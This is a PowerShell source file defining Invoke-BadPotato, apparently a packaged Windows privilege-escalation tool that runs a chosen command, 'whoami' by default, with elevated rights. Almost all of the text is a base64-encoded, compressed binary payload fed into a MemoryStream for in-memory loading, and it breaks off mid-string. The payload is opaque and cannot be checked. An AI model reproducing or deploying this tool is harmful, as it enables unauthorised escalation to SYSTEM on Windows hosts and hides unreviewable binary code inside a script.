function Invoke-BadPotato
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = "whoami"

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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